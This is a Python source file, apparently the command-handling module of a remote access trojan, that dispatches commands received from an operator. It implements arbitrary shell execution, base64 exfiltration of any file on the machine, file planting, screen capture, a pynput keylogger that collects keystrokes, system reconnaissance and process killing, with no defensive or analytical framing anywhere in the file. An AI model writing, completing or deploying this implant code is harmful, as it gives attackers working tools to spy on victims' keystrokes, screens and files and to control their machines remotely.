#!/usr/bin/env python3
"""
Command execution engine
"""

import os
import subprocess
import base64
import io
from typing import Dict, Any


class CommandExecutor:
    def __init__(self):
        self.keylogger_active = False
        self.keylog_buffer = []
        
    async def execute(self, command: Dict[str, Any]) -> Dict[str, Any]:
        cmd_type = command['type']
        args = command.get('args', {})
        
        handlers = {
            'shell': self._shell,
            'download': self._download,
            'upload': self._upload,
            'screenshot': self._screenshot,
            'keylog_start': self._keylog_start,
            'keylog_stop': self._keylog_stop,
            'info': self._info,
            'processes': self._processes,
            'kill': self._kill,
            'cd': self._cd,
            'pwd': self._pwd,
            'ls': self._ls,
        }
        
        handler = handlers.get(cmd_type)
        if not handler:
            return {'status': 'error', 'data': f"Unknown command: {cmd_type}"}
        
        try:
            result = await handler(**args)
            return {'status': 'success', 'data': result}
        except Exception as e:
            return {'status': 'error', 'data': str(e)}
    
    async def _shell(self, command: str) -> str:
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=60
            )
            output = result.stdout if result.stdout else result.stderr
            return output if output else "[Executed successfully, no output]"
        except subprocess.TimeoutExpired:
            return "[Command timed out after 60s]"
    
    async def _download(self, remote_path: str) -> str:
        try:
            with open(remote_path, 'rb') as f:
                data = f.read()
            return base64.b64encode(data).decode()
        except Exception as e:
            return f"Download error: {e}"
    
    async def _upload(self, local_path: str, remote_path: str) -> str:
        try:
            # Data comes in command args as base64
            data = base64.b64decode(local_path)
            with open(remote_path, 'wb') as f:
                f.write(data)
            return f"Uploaded to {remote_path}"
        except Exception as e:
            return f"Upload error: {e}"
    
    async def _screenshot(self) -> str:
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            return base64.b64encode(buffer.getvalue()).decode()
        except ImportError:
            return "Screenshot error: Pillow not installed (pip install Pillow)"
        except Exception as e:
            return f"Screenshot error: {e}"
    
    async def _keylog_start(self) -> str:
        try:
            from pynput import keyboard
            self.keylogger_active = True
            self.keylog_buffer = []
            
            def on_press(key):
                if self.keylogger_active:
                    try:
                        self.keylog_buffer.append(key.char)
                    except AttributeError:
                        self.keylog_buffer.append(f"[{key}]")
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            self._keylog_listener = listener
            return "Keylogger started"
        except ImportError:
            return "Keylogger error: pynput not installed (pip install pynput)"
        except Exception as e:
            return f"Keylogger error: {e}"
    
    async def _keylog_stop(self) -> str:
        if hasattr(self, '_keylog_listener'):
            self._keylog_listener.stop()
        self.keylogger_active = False
        log_data = ''.join(self.keylog_buffer)
        self.keylog_buffer = []
        return f"Keylog captured ({len(log_data)} chars):\n{log_data[:1000]}"
    
    async def _info(self) -> str:
        import platform
        import getpass
        return f"""
OS: {platform.system()} {platform.release()}
User: {getpass.getuser()}
Hostname: {platform.node()}
Python: {platform.python_version()}
CWD: {os.getcwd()}
PID: {os.getpid()}
"""
    
    async def _processes(self) -> str:
        try:
            if os.name == 'nt':  # Windows
                result = subprocess.run(['tasklist'], capture_output=True, text=True)
            else:  # Unix
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            return result.stdout[:3000]  # Limit output
        except Exception as e:
            return f"Process list error: {e}"
    
    async def _kill(self, pid: int) -> str:
        try:
            if os.name == 'nt':
                subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
            else:
                os.kill(int(pid), 9)
            return f"Process {pid} killed"
        except Exception as e:
            return f"Kill error: {e}"
    
    async def _cd(self, path: str) -> str:
        os.chdir(path)
        return f"Changed to: {os.getcwd()}"
    
    async def _pwd(self) -> str:
        return os.getcwd()
    
    async def _ls(self, path: str = '.') -> str:
        try:
            items = os.listdir(path)
            result = []
            for item in items:
                full = os.path.join(path, item)
                size = os.path.getsize(full) if os.path.isfile(full) else '<DIR>'
                result.append(f"{size:>10} {item}")
            return '\n'.join(result)
        except Exception as e:
            return f"ls error: {e}"